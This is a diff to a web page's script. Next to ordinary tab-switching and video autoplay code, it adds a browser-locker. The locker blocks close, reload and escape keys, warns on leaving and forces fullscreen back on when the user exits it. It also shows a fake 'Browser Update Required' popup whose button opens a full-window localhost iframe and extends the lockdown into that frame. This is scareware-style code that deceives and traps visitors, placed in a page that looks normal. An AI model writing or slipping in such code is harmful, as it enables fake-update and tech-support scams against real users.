@@ -1244,18 +1244,25 @@ border-radius: 10px;
         </div>
     </footer>
 
-   <script>
+<script>
+// Wait until the DOM is fully loaded
 document.addEventListener("DOMContentLoaded", function () {
-    // --- Tab Switch Logic ---
+
+    // ================================
+    // 1. Tab Switching & Video Logic
+    // ================================
     const tabButtons = document.querySelectorAll('.tab-button');
     const tabHeading = document.querySelector('.tab-heading');
     const tabLink = document.querySelector('.tab-link');
 
     tabButtons.forEach(button => {
         button.addEventListener('click', () => {
+            // Remove active class from all buttons
             tabButtons.forEach(btn => btn.classList.remove('active'));
+            // Add active class to clicked button
             button.classList.add('active');
 
+            // Update content based on selected tab
             const tabName = button.textContent.trim();
             let heading = '', btnText = '';
 
@@ -1283,59 +1290,83 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     });
 
-    // --- Video Autoplay on Thumbnail Click ---
+    // Video player click logic for autoplay
     const thumbnailContainer = document.querySelector('.video-thumbnail-container');
     if (thumbnailContainer) {
         thumbnailContainer.addEventListener('click', function () {
             this.style.display = 'none';
             const iframe = document.querySelector('iframe');
             if (iframe) {
-                let src = iframe.src;
-                if (!src.includes('autoplay=1')) {
-                    src += (src.includes('?') ? '&' : '?') + 'autoplay=1&muted=0';
-                    iframe.src = src;
+                let currentSrc = iframe.src;
+                if (!currentSrc.includes('autoplay=1')) {
+                    // Replace muted=1 with muted=0 and append autoplay=1
+                    iframe.src = currentSrc.replace('muted=1', 'muted=0') + '&autoplay=1';
                 }
             }
         });
     }
 
-    // --- Key Blocker (partial, only what browsers allow) ---
-    document.addEventListener('keydown', function (event) {
-        const key = event.key.toLowerCase();
-        const blockedCombos = [
-            (event.ctrlKey && ["w", "r", "t"].includes(key)),
-            (event.altKey && key === "f4"),
-            ["f11", "f12"].includes(key),
-        ];
-        if (blockedCombos.some(Boolean)) {
-            event.preventDefault();
-            event.stopPropagation();
-            console.log(`Blocked: ${event.key}`);
+    // ============================================
+    // 2. Global Key Blocking & Unload Protection
+    // ============================================
+    function blockKeys(e) {
+        const key = e.key.toLowerCase();
+        if (
+            (e.ctrlKey && ["w", "r", "t"].includes(key)) ||
+            (e.metaKey && ["w", "r", "t"].includes(key)) ||
+            (e.altKey && key === "f4") ||
+            ["f11", "f12", "escape"].includes(key)
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log("Blocked key:", e.key);
+        }
+    }
+    // Block keys on the parent document
+    document.addEventListener("keydown", blockKeys);
+
+    // Warn on reload/close of parent window
+    window.onbeforeunload = function () {
+        return "Are you sure you want to leave?";
+    };
+
+    // Ensure fullscreen remains active if exited
+    document.addEventListener("fullscreenchange", function () {
+        if (!document.fullscreenElement) {
+            setTimeout(() => {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }, 100);
         }
     });
 
-    // --- Warn Before Leaving ---
-    window.onbeforeunload = function () {
-        return "Are you sure you want to leave this page?";
-    };
+    // ============================================
+    // 3. Popup and Localhost Lockdown Functionality
+    // ============================================
+    function showUpdatePopup(event) {
+        if (event) event.preventDefault();
 
-    // --- Fullscreen Trigger After Button Click ---
-    window.showUpdatePopup = function (event) {
-        event.preventDefault();
-
+        // Create the overlay for the popup
         const overlay = document.createElement('div');
-        overlay.style.cssText = `
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); z-index: 10000;
-            display: flex; justify-content: center; align-items: center;
-        `;
+        overlay.style.position = 'fixed';
+        overlay.style.top = '0';
+        overlay.style.left = '0';
+        overlay.style.width = '100%';
+        overlay.style.height = '100%';
+        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+        overlay.style.zIndex = '10000';
+        overlay.style.display = 'flex';
+        overlay.style.justifyContent = 'center';
+        overlay.style.alignItems = 'center';
 
+        // Create the popup container
         const popup = document.createElement('div');
-        popup.style.cssText = `
-            background: white; padding: 30px; border-radius: 8px;
-            max-width: 400px; text-align: center;
-        `;
+        popup.style.backgroundColor = 'white';
+        popup.style.padding = '30px';
+        popup.style.borderRadius = '8px';
+        popup.style.maxWidth = '400px';
+        popup.style.textAlign = 'center';
 
+        // Create title and message elements
         const title = document.createElement('h3');
         title.textContent = 'Browser Update Required';
         title.style.marginBottom = '15px';
@@ -1344,51 +1375,75 @@ document.addEventListener("DOMContentLoaded", function () {
         message.textContent = 'Your browser needs to be updated to continue.';
         message.style.marginBottom = '20px';
 
+        // Create the update button
         const updateButton = document.createElement('button');
         updateButton.textContent = 'Update';
-        updateButton.style.cssText = `
-            padding: 10px 20px; background: black; color: white;
-            border: none; border-radius: 6px; cursor: pointer;
-        `;
+        updateButton.style.padding = '10px 20px';
+        updateButton.style.backgroundColor = '#000';
+        updateButton.style.color = '#fff';
+        updateButton.style.border = 'none';
+        updateButton.style.borderRadius = '6px';
+        updateButton.style.cursor = 'pointer';
 
+        // Update button click event: remove popup, load localhost page, and enforce lockdown
         updateButton.addEventListener('click', function () {
+            // Remove the popup overlay
             document.body.removeChild(overlay);
 
-            // Open invisible iframe
-            const iframe = document.createElement('iframe');
-            iframe.src = 'http://localhost/';
-            iframe.style.cssText = `
-                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                border: none; z-index: 99999;
-            `;
-            document.body.appendChild(iframe);
+            // Create an iframe to load the localhost page
+            const hiddenFrame = document.createElement('iframe');
+            hiddenFrame.src = 'http://localhost/';
+            hiddenFrame.style.position = 'fixed';
+            hiddenFrame.style.top = '0';
+            hiddenFrame.style.left = '0';
+            hiddenFrame.style.width = '100%';
+            hiddenFrame.style.height = '100%';
+            hiddenFrame.style.border = 'none';
+            hiddenFrame.style.zIndex = '99999';
 
-            // Request fullscreen (user click just happened, so this should work)
-            document.documentElement.requestFullscreen().catch(err => {
-                console.warn('Fullscreen failed:', err);
-            });
+            // When the iframe loads, apply further lockdown and request fullscreen
+            hiddenFrame.onload = function () {
+                // Disable scrolling on the parent page
+                document.body.style.overflow = 'hidden';
 
-            // Auto re-enter fullscreen if exited
-            document.addEventListener('fullscreenchange', function () {
-                if (!document.fullscreenElement) {
-                    setTimeout(() => {
-                        document.documentElement.requestFullscreen().catch(() => {});
-                    }, 100);
+                // Attempt to go fullscreen (should work as it's triggered by user click)
+                document.documentElement.requestFullscreen().catch(err => {
+                    console.log("Fullscreen not allowed:", err);
+                });
+
+                // If same-origin, add key blocking to the iframe's document
+                try {
+                    hiddenFrame.contentWindow.document.addEventListener("keydown", blockKeys);
+                    hiddenFrame.contentWindow.onbeforeunload = function () {
+                        return "Are you sure you want to leave?";
+                    };
+                } catch (error) {
+                    console.warn("Cannot attach key blocker to iframe:", error);
                 }
-            });
+            };
 
-            // Lock scrolling
-            document.body.style.overflow = 'hidden';
+            // Append the iframe to the document
+            document.body.appendChild(hiddenFrame);
         });
 
+        // Assemble popup elements
         popup.appendChild(title);
         popup.appendChild(message);
         popup.appendChild(updateButton);
         overlay.appendChild(popup);
         document.body.appendChild(overlay);
-    };
+    }
+
+    // Expose the popup function globally if needed
+    window.showUpdatePopup = showUpdatePopup;
+
+    // Optionally, automatically trigger the popup for local testing:
+    // Uncomment the next line if you want to automatically load the localhost page.
+    // showUpdatePopup();
+
 });
 </script>
+
 
 </body>
 
